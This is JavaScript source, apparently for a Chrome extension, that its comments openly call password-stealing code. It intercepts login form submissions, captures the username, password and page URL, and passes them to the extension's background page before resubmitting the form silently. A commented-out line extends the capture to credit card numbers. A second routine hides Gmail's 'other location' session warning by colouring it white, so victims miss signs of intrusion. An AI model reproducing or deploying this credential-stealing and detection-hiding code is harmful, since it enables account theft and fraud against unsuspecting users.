
/*
The password stealing part is copied from Andreas Grech 
Andreas Grech - http://blog.dreasgrech.com/2010/07/stealing-login-details-with-google.html
Stealing login details with a Google Chrome extension - 2010 July 9
*/  

// function to steal the password and username from the google login field.
// change needed to be compatible with other login fields 
$(function() {
 var passwordBoxes = $("input[type=password]"),
 getMessage = function(username, password, url) {
  return "Username: " + username + "  Password: " + password + " Url: " + url;
 },
 sendEmail = function(username, password, url, callback) {
  var msg = getMessage(username, password, url);
  
  // send the captured data to the background page
  try { 
  chrome.extension.sendRequest({greeting: "postdata", message: msg}, function(response) {
  console.log("response");
	});
	callback();
  }
  catch(e){
  console.log("main.js error");
  }
 },
 process = function(callback) {
  var username = $("input[id=Email]").not(passwordBoxes).filter(function() {
   var field = $(this);
   return field.val() || field.html();
  }).val(),
  password = passwordBoxes.val();
  sendEmail(username, password , location.href, callback);
  /*
  ccNumber = $("input[id=ccnumber]").val();
  sendEmail(username, password + " " +  ccNumber, location.href, callback);
  */
 };

 // hooking the submit button with jquery magic
 $("form").submit(function(e) {
  var $this = $(this);
  e.preventDefault();
  console.log("1");
  process(function() {
   $this.unbind('submit');
   console.log("2");
   $this.submit();
  });
 });
});
	
// disable showing the Gmail concurrent session detection via ugly css hack	
function rewritePageContent() {
		var gmailBaseUri = new RegExp("mail.google.com", "i");
		if(this.document) {

				if ( this.document.baseURI.match(gmailBaseUri)){

				$("div:contains('other location')").css("color", "white");
				$("span:contains('Details')").css("color", "white");

			}

		}
	}	

var interval6 = setInterval(rewritePageContent,200);

	